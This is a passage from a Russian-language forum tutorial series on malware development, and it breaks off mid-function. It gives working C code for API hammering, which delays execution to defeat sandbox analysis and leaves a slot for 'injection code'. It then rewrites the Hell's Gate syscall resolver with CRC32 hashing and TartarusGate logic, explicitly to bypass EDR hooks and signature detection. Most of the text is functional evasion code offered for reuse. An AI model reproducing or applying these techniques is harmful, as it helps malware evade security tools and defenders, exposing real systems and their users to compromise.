            dwNumberOfBytesWritten    = NULL;

    PBYTE   pRandBuffer               = NULL;
    SIZE_T  sBufferSize               = 0xFFFFF;    // 1048575 байт

    INT     Random                    = 0;

    // Получение пути к временной папке
    if (!GetTempPathW(MAX_PATH, szTmpPath)) {
        printf(&quot;[!] GetTempPathW завершилось ошибкой: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Создание пути к файлу
    wsprintfW(szPath, L&quot;%s%s&quot;, szTmpPath, TMPFILE);

    for (SIZE_T i = 0; i &lt; dwStress; i++){

        // Создание файла в режиме записи
        if ((hWFile = CreateFileW(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
            printf(&quot;[!] CreateFileW завершилось ошибкой: %d \n&quot;, GetLastError());
            return FALSE;
        }

        // Выделение буфера и заполнение его случайным значением
        pRandBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufferSize);
        Random = rand() % 0xFF;
        memset(pRandBuffer, Random, sBufferSize);

        // Запись случайных данных в файл
        if (!WriteFile(hWFile, pRandBuffer, sBufferSize, &amp;dwNumberOfBytesWritten, NULL) || dwNumberOfBytesWritten != sBufferSize) {
            printf(&quot;[!] WriteFile завершилось ошибкой: %d \n&quot;, GetLastError());
            printf(&quot;[i] Записано %d байт из %d \n&quot;, dwNumberOfBytesWritten, sBufferSize);
            return FALSE;
        }

        // Очистка буфера и закрытие дескриптора файла
        RtlZeroMemory(pRandBuffer, sBufferSize);
        CloseHandle(hWFile);

        // Открытие файла в режиме чтения и удаление при закрытии
        if ((hRFile = CreateFileW(szPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
            printf(&quot;[!] CreateFileW завершилось ошибкой: %d \n&quot;, GetLastError());
            return FALSE;
        }

        // Чтение ранее записанных случайных данных
        if (!ReadFile(hRFile, pRandBuffer, sBufferSize, &amp;dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != sBufferSize) {
            printf(&quot;[!] ReadFile завершилось ошибкой: %d \n&quot;, GetLastError());
            printf(&quot;[i] Прочитано %d байт из %d \n&quot;, dwNumberOfBytesRead, sBufferSize);
            return FALSE;
        }

        // Очистка буфера и его освобождение
        RtlZeroMemory(pRandBuffer, sBufferSize);
        HeapFree(GetProcessHeap(), NULL, pRandBuffer);

        // Закрытие дескриптора файла - удаление файла
        CloseHandle(hRFile);
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Задержка выполнения с помощью API Hammering</b><br />
<br />
Чтобы задержать выполнение с помощью API Hammering, вычислите, сколько времени требуется функции ApiHammering для выполнения определенного числа циклов. Для этого используйте функцию GetTickCount64 WinAPI для измерения времени до и после вызова ApiHammering. В этом примере количество циклов составит 1000.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    DWORD    T0    = NULL,
            T1    = NULL;

    T0 = GetTickCount64();

    if (!ApiHammering(1000)) {
        return -1;
    }

    T1 = GetTickCount64();

    printf(&quot;&gt;&gt;&gt; ApiHammering(1000) Заняло : %d миллисекунд для завершения \n&quot;, (DWORD)(T1 - T0));

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы выйти ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746787449191.png"
		data-src="https://osint42.org/attachments/1746787449191-png.253/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787449191-png.253/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787449191.png"
			title="1746787449191.png"
			width="1345" height="111" loading="lazy" />
	</div><br />
<br />
Вывод показывает, что 1000 циклов требуют примерно 5.1 секунды на текущей машине. Это число немного будет отличаться в зависимости от технических характеристик целевой системы.<br />
<br />
<b>Преобразование секунд в циклы</b><br />
<br />
Макрос SECTOSTRESS, приведенный ниже, может быть использован для преобразования количества секунд, i, в количество циклов. Поскольку 1000 циклов занимают 5.157 секунд, одна секунда будет занимать 1000 / 5.157 = 194 цикла. Результат макроса следует использовать в качестве параметра для функции ApiHammering.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define SECTOSTRESS(i) ((int)i * 194)</code></pre>
	</div>
</div><br />
<b>Задержка выполнения с помощью кода API Hammering</b><br />
<br />
Фрагмент кода ниже показывает главную функцию, использующую ранее упомянутую технику.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

  DWORD T0  = NULL,
        T1  = NULL;

  T0 = GetTickCount64();

  // Задержка выполнения на &#039;5&#039; секунд по количеству циклов
  if (!ApiHammering(SECTOSTRESS(5))) {
    return -1;
  }

  T1 = GetTickCount64();

  printf(&quot;&gt;&gt;&gt; ApiHammering задержал выполнение на : %d \n&quot;, (DWORD)(T1 - T0));

  printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы выйти ... &quot;);
  getchar();

  return 0;
}</code></pre>
	</div>
</div><br />
<b>API Hammering в потоке </b><br />
<br />
Функцию ApiHammering можно выполнить в потоке, который работает в фоновом режиме до завершения выполнения основного потока. Для этого можно использовать функцию CreateThread из WinAPI. Функции ApiHammering следует передать значение -1, что заставит ее выполняться в бесконечном цикле.<br />
<br />
Главная функция, показанная ниже, создает новый поток и вызывает функцию ApiHammering со значением -1.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    DWORD dwThreadId = NULL;

    if (!CreateThread(NULL, NULL, ApiHammering, (LPVOID)-1, NULL, &amp;dwThreadId)) {
        printf(&quot;[!] CreateThread завершилось ошибкой: %d \n&quot;, GetLastError());
        return -1;
    }

    printf(&quot;[+] Поток %d был создан для выполнения ApiHammering в фоновом режиме\n&quot;, dwThreadId);

    /*

        Место для вставки кода инъекции

    */

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы выйти ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div></div>
						

							<h2>Открываем врата ада</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746787685671.png"
		data-src="https://osint42.org/attachments/1746787685671-png.254/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787685671-png.254/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787685671.png"
			title="1746787685671.png"
			width="600" height="352" loading="lazy" />
	</div><br />
<br />
В этих темах:<br />
<br />


<div class="embed fauxBlockLink" data-embed-content="ams_page-29" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/predel-naya-tekhnika-razborka-s-siskolami.29/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="page/predel-naya-tekhnika-razborka-s-siskolami.29/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../data/attachments/0/197-ec0391203463a22d22f1237ee738d6770e2b.jpg?hash=5UksgehQuL' loading='lazy' width='150' height='150' alt='Предельная техника. Разборка с сисколами' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="page/predel-naya-tekhnika-razborka-s-siskolami.29/index.html"> Цикл статей &quot;Изучение вредоносных программ&quot; - Предельная техника. Разборка с сисколами</a>
				</h3>

				<div class="contentRow-snippet">
					Что такое системные вызовы (Syscalls)

Системные вызовы Windows или syscalls служат интерфейсом для взаимодействия программ с системой, позволяя им запрашивать определенные услуги, такие как чтение или запись в файл, создание нового процесса или выделение памяти.

Помните из вводных модулей, что...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T13:14:25+0300" data-timestamp="1746785665" data-date="09.05.2025" data-time="13:14" data-short="9 Май" title="09.05.2025 в 13:14">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div>

<div class="embed fauxBlockLink" data-embed-content="ams_page-30" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../data/attachments/0/227-617ec7b35374fc4fb82dd47ecbdb78dc2104.jpg?hash=aos6xYS5-8' loading='lazy' width='267' height='150' alt='Предельная техника-2. Практика. Реализуем техники инъекции через сисколы' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html"> Цикл статей &quot;Изучение вредоносных программ&quot; - Предельная техника-2. Практика. Реализуем техники инъекции через сисколы</a>
				</h3>

				<div class="contentRow-snippet">
					В прошлой статье:Предельная техника. Разборка с сисколами | Цикл статей &quot;Изучение вредоносных программ&quot; мы разобрали теорию.

Давайте теперь переделаем техники:

https://osint42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/izuchayem-tekhniku-thread-hijacking.18/...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T13:28:08+0300" data-timestamp="1746786488" data-date="09.05.2025" data-time="13:28" data-short="9 Май" title="09.05.2025 в 13:28">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div><br />
Мы обсуждали прямые системные вызовы для обхода хуков и детекта по поведению.<br />
<br />
Мы там использовали вспомогательный инструмент Hell&#039;s Gate, предлагаю в этой статье модифицировать этот инструмент, что-бы избежать детект на сам инструмент.)<br />
<br />
Обновления сделают реализацию более настраиваемой и, следовательно, более скрытной и уменьшат вероятность обнаружения на основе сигнатур. Кроме того, обновленный код изменит способ получения SSN системного вызова, используя <a href="https://github.com/trickster0/TartarusGate" target="_blank" class="link link--external" rel="noopener">метод TartarusGate.</a><br />
<br />
Если вам нужно восстановить информацию о первоначальной реализации Hell&#039;s Gate, посетите репозиторий <a href="https://github.com/am0nsec/HellsGate" target="_blank" class="link link--external" rel="noopener">Hell&#039;s Gate на GitHub.</a><br />
<br />
<b>Обновление алгоритма хэширования строк</b><br />
<br />
Первоначальная реализация Hell&#039;s Gate использовала алгоритм хэширования строк DJB2. Обновление алгоритма хэширования строк не влияет на реализацию Hell&#039;s Gate, но изменение алгоритма хэширования строк вероятно уменьшит вероятность обнаружения сигнатур. Функция djb2 заменяется следующей функцией.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>unsigned int crc32h(char* message) {
    int i, crc;
    unsigned int byte, c;
    const unsigned int g0 = SEED, g1 = g0 &gt;&gt; 1,
        g2 = g0 &gt;&gt; 2, g3 = g0 &gt;&gt; 3, g4 = g0 &gt;&gt; 4, g5 = g0 &gt;&gt; 5,
        g6 = (g0 &gt;&gt; 6) ^ g0, g7 = ((g0 &gt;&gt; 6) ^ g0) &gt;&gt; 1;

    i = 0;
    crc = 0xFFFFFFFF;
    while ((byte = message[i]) != 0) {    // Получить следующий байт.
        crc = crc ^ byte;
        c = ((crc &lt;&lt; 31 &gt;&gt; 31) &amp; g7) ^ ((crc &lt;&lt; 30 &gt;&gt; 31) &amp; g6) ^
            ((crc &lt;&lt; 29 &gt;&gt; 31) &amp; g5) ^ ((crc &lt;&lt; 28 &gt;&gt; 31) &amp; g4) ^
            ((crc &lt;&lt; 27 &gt;&gt; 31) &amp; g3) ^ ((crc &lt;&lt; 26 &gt;&gt; 31) &amp; g2) ^
            ((crc &lt;&lt; 25 &gt;&gt; 31) &amp; g1) ^ ((crc &lt;&lt; 24 &gt;&gt; 31) &amp; g0);
        crc = ((unsigned)crc &gt;&gt; 8) ^ c;
        i = i + 1;
    }
    return ~crc;
}</code></pre>
	</div>
</div><br />
Функция crc32h представляет собой реализацию алгоритма хэширования строк Cyclic Redundancy Check (CRC32) и будет использоваться в этом разделе. Для повышения читаемости и обслуживаемости кода функция crc32h будет вызываться через следующую макросовую инструкцию.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define HASH(API) crc32h((char*)API)</code></pre>
	</div>
</div><br />
Где переменная API - это строка, которую необходимо хэшировать с использованием crc32h.<br />
<br />
<b>Обновление GetVxTableEntry<br />
<br />
Создание структуры NTDLL_CONFIG</b><br />
<br />
Напомним, что функция GetVxTableEntry используется для извлечения адреса и SSN (номера системного вызова) указанного системного вызова с использованием его хэш-значения. Функция GetVxTableEntry вычисляет необходимые RVAs (относительные адреса) для поиска указанного хэша и принимает два дополнительных параметра, pModuleBase и pImageExportDirectory, которые не связаны с ее назначением. Для улучшения эффективности создается структура NTDLL_CONFIG, которая представлена ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _NTDLL_CONFIG
{
    PDWORD      pdwArrayOfAddresses; // VA массива адресов экспортируемых функций ntdll
    PDWORD      pdwArrayOfNames;     // VA массива имен экспортируемых функций ntdll
    PWORD       pwArrayOfOrdinals;   // VA массива порядковых номеров экспортируемых функций ntdll
    DWORD       dwNumberOfNames;     // количество экспортируемых функций из ntdll.dll
    ULONG_PTR   uModule;             // базовый адрес ntdll - необходим для вычисления будущих RVAs

} NTDLL_CONFIG, *PNTDLL_CONFIG;

// Глобальная переменная
NTDLL_CONFIG g_NtdllConf = { 0 };</code></pre>
	</div>
</div><br />
<b>Создание InitNtdllConfigStructure</b><br />
<br />
Кроме того, создается приватная функция InitNtdllConfigStructure, которая вызывается функцией GetVxTableEntry для инициализации глобальной структуры g_NtdllConf. Это позволяет GetVxTableEntry обращаться к значениям из заголовков NTDLL без необходимости дополнительных параметров или вычислений каждый раз. В результате функция InitNtdllConfigStructure инициализирует структуру g_NtdllConf для будущего использования.<br />
<br />
Функция InitNtdllConfigStructure получает базовый адрес NTDLL и выполняет разбор PE (Portable Executable) для извлечения структуры директории экспорта. Затем функция вычисляет необходимые RVAs для заполнения структуры g_NtdllConf необходимыми данными. Функция возвращает TRUE, если она успешно выполняет эти действия, и FALSE, если структура g_NtdllConf все еще содержит неинициализированные элементы.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InitNtdllConfigStructure() {

    // Получение PEB (Process Environment Block)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || pPeb-&gt;OSMajorVersion != 0xA)
        return FALSE;

    // Получение модуля ntdll.dll
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // Получение базового адреса ntdll
    ULONG_PTR uModule = (ULONG_PTR)(pLdr-&gt;DllBase);
    if (!uModule)
        return FALSE;

    // Получение заголовка DOS для ntdll
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // Получение заголовков NT для ntdll
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // Получение директории экспорта для ntdll
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir)
        return FALSE;

    // Инициализация элементов структуры &#039;g_NtdllConf&#039;
    g_NtdllConf.uModule             = uModule;
    g_NtdllConf.dwNumberOfNames     = pImgExpDir-&gt;NumberOfNames;
    g_NtdllConf.pdwArrayOfNames     = (PDWORD)(uModule + pImgExpDir-&gt;AddressOfNames);
    g_NtdllConf.pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir-&gt;AddressOfFunctions);
    g_NtdllConf.pwArrayOfOrdinals   = (PWORD)(uModule  + pImgExpDir-&gt;AddressOfNameOrdinals);

    // Проверка
    if (!g_NtdllConf.uModule || !g_NtdllConf.dwNumberOfNames || !g_NtdllConf.pdwArrayOfNames || !g_NtdllConf.pdwArrayOfAddresses || !g_NtdllConf.pwArrayOfOrdinals)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Переименование и обновление GetVxTableEntry</b><br />
<br />
GetVxTableEntry переименована в FetchNtSyscall и будет иметь два параметра: dwSysHash, хэш-значение указанного системного вызова для извлечения SSN, и pNtSys, указатель на структуру NT_SYSCALL, которая содержит всю необходимую информацию для выполнения прямого системного вызова. Эта структура будет инициализирована функцией FetchNtSyscall.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _NT_SYSCALL
{
    DWORD dwSSn;                    // номер системного вызова
    DWORD dwSyscallHash;            // хэш-значение системного вызова
    PVOID pSyscallAddress;          // адрес системного вызова

} NT_SYSCALL, *PNT_SYSCALL;</code></pre>
	</div>
</div><br />
<b>Функция FetchNtSyscall выполняет следующие действия:</b><br />
<br />
Проверяет, инициализирована ли глобальная структура g_NtdllConf. Если нет, она вызывает InitNtdllConfigStructure для ее инициализации. Проверяет, указал ли пользователь хэш-значение, иначе возвращает FALSE. Инициирует цикл for для поиска указанного системного вызова по его хэш-значению. Когда системный вызов найден, он сохраняет его адрес в структуре pNtSys. Затем инициирует цикл while для поиска SSN системного вызова. Логика поиска такая же, как и в исходной реализации. Если SSN найден, он сохраняется в структуре pNtSys. Затем функция выходит из обоих циклов и выполняет окончательную проверку, чтобы убедиться, что все элементы структуры NT_SYSCALL инициализированы. Результат возвращается после этой проверки.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // Инициализация конфигурации ntdll, если не найдена
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    // Если не указано хэш-значение
    if (dwSysHash != NULL)
        pNtSys-&gt;dwSyscallHash = dwSysHash;
    else
        return FALSE;

    // Поиск &#039;dwSysHash&#039; в экспортируемых функциях ntdll
    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName   = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        // Если системный вызов найден
        if (HASH(pcFuncName) == dwSysHash) {

            // Сохранение адреса
            pNtSys-&gt;pSyscallAddress = pFuncAddress;

            WORD cw = 0;

            // Поиск SSN
            while (TRUE) {

                // Достигли инструкции &#039;ret&#039; - мы находимся далеко внизу
                if (*((PBYTE)pFuncAddress + cw) == 0xC3 &amp;&amp; !pNtSys-&gt;dwSSn)
                    return FALSE;

                // Достигли инструкции &#039;syscall&#039; - мы находимся далеко внизу
                if (*((PBYTE)pFuncAddress + cw) == 0x0F &amp;&amp; *((PBYTE)pFuncAddress + cw + 1) == 0x05 &amp;&amp; !pNtSys-&gt;dwSSn)
                    return FALSE;

                if (*((PBYTE)pFuncAddress + cw) == 0x4C
                    &amp;&amp; *((PBYTE)pFuncAddress + 1 + cw) == 0x8B
                    &amp;&amp; *((PBYTE)pFuncAddress + 2 + cw) == 0xD1
                    &amp;&amp; *((PBYTE)pFuncAddress + 3 + cw) == 0xB8
                    &amp;&amp; *((PBYTE)pFuncAddress + 6 + cw) == 0x00
                    &amp;&amp; *((PBYTE)pFuncAddress + 7 + cw) == 0x00) {

                    BYTE high = *((PBYTE)pFuncAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFuncAddress + 4 + cw);
                    // Сохранение SSN
                    pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
                    break; // Выход из цикла while
                }

                cw++;
            }

            break; // Выход из цикла for
        }
    }

    // Проверка, инициализированы ли все элементы NT_SYSCALL (pNtSys)
    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Улучшение логики извлечения SSN</b><br />
<br />
Напомним, что при поиске SSN (номера системного вызова) Hell&#039;s Gate ограничивает границы поиска, проверяя наличие инструкций syscall или ret. Если одна из этих инструкций найдена, и SSN еще не был получен, то поиск завершается неудачей, что предотвращает извлечение неправильного значения SSN из другой функции системного вызова.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787731238.png"
		data-src="https://osint42.org/attachments/1746787731238-png.255/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787731238-png.255/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787731238.png"
			title="1746787731238.png"
			width="794" height="353" loading="lazy" />
	</div><br />
<br />
<b>TartarusGate</b><br />
<br />
В TartarusGate был представлен альтернативный способ поиска SSN, который иллюстрирован на изображении ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787739086.png"
		data-src="https://osint42.org/attachments/1746787739086-png.256/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787739086-png.256/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787739086.png"
			title="1746787739086.png"
			width="1242" height="598" loading="lazy" />
	</div><br />
<br />
Предположим, что вызов системного вызова B выполняется с использованием реализации Hell&#039;s Gate. В этом случае будет осуществляться поиск операций 0x4c, 0x8b, 0xd1, 0xb8, которые представляют собой инструкции mov r10, rcx и mov rcx, ssn. Но, как показано на изображении выше, таких операций нет, что означает, что реализация Hell&#039;s Gate не сможет получить SSN для системного вызова B.<br />
<br />
TartarusGate использует соседние системные вызовы для вычисления SSN указанного системного вызова. Если TartarusGate ищет вверх, то SSN системного вызова B равен SSN системного вызова A - 1. С другой стороны, если TartarusGate ищет вниз, то SSN системного вызова B равен SSN системного вызова C + 1.<br />
<br />
Обратите внимание, что путь поиска может распространяться за пределы непосредственно соседних системных вызовов. Например, если выполняется вызов системного вызова C, то SSN системного вызова C будет равен следующим возможным операциям:<br />
<br />
Syscall A&#039;s SSN plus two<br />
Syscall B&#039;s SSN plus one<br />
Syscall D&#039;s SSN minus one<br />
Syscall E&#039;s SSN minus two<br />
Syscall F&#039;s SSN minus three<br />
<br />
На изображении ниже это более наглядно иллюстрируется, где idx - это число для добавления или вычитания.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787747960.png"
		data-src="https://osint42.org/attachments/1746787747960-png.257/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787747960-png.257/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787747960.png"
			title="1746787747960.png"
			width="1212" height="696" loading="lazy" />
	</div><br />
<br />
<b>Обновление функции FetchNtSyscall</b><br />
<br />
После понимания того, как работает TartarusGate, функция FetchNtSyscall обновляется для использования этой логики поиска. Некоторые аспекты обновленной функции FetchNtSyscall:<br />
<br />
RANGE равен 255, представляя максимальное количество системных вызовов, чтобы двигаться вверх или вниз в памяти.<br />
<br />
UP равно 32, что является размером системного вызова. Это используется при поиске вверх.<br />
DOWN равно -32, что является отрицательным размером системного вызова. Это используется при поиске вниз.<br />
<br />
Когда путь поиска направлен вверх, SSN указанного системного вызова вычисляется как (high &lt;&lt; 8) | low + idx, где idx - это количество системных вызовов выше текущего системного вызова (адрес pFuncAddress). Когда путь поиска направлен вниз, SSN указанного системного вызова вычисляется как (high &lt;&lt; 8) | low - idx, где idx - это количество системных вызовов ниже текущего системного вызова (адрес pFuncAddress).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // Инициализация конфигурации ntdll, если не найдена
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    if (dwSysHash != NULL)
        pNtSys-&gt;dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++){

        PCHAR pcFuncName    = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress  = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        pNtSys-&gt;pSyscallAddress = pFuncAddress;

        // if syscall found
        if (HASH(pcFuncName) == dwSysHash) {

            if (*((PBYTE)pFuncAddress) == 0x4C
                &amp;&amp; *((PBYTE)pFuncAddress + 1) == 0x8B
                &amp;&amp; *((PBYTE)pFuncAddress + 2) == 0xD1
                &amp;&amp; *((PBYTE)pFuncAddress + 3) == 0xB8
                &amp;&amp; *((PBYTE)pFuncAddress + 6) == 0x00
                &amp;&amp; *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low  = *((PBYTE)pFuncAddress + 4);
                pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
                break; // Выход из цикла for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
